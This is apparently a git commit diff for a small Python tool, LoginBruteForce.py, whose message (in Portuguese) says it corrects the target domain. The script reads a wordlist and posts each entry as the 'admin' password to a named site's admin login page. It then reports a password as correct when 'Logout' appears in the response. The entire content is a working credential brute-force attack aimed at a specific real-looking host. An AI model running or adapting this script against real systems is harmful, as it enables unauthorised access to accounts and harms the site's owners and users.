092c29cabc650cfdc3170ffd98ed84fecb534df7
Samuel-ziger <girakosam3@gmail.com>
2025-12-08 22:48:20 -0300

    correçaõ de dominio alvo

--- Ferramentas/LoginBruteForce.py
+++ Ferramentas/LoginBruteForce.py
@@ -1,10 +1,14 @@
 import requests
 
-with open ("wordlist.txt", "r") as file:
+with open("wordlist.txt", "r") as file:
     wordlist = file.read().splitlines()
 
-    for word in wordlist:
-        data = {"user" : "admin", "password" : word}
-        response = requests.post("https//:advanced.baconcn.com/admin/index.php ", data=data)
-        if "Logout" in response.text:
-            print("Senha {} correta encontrada!".format(word))
+
+for word in wordlist:
+    data = {"user": "admin", "password": word}
+    response = requests.post("http://www.bancocn.com/admin/login.php", data=data)
+
+    if "Logout" in response.text:
+        print("Senha {} correta encontrada!".format(word))
+    else:
+        print("Senha {} incorreta.".format(word))
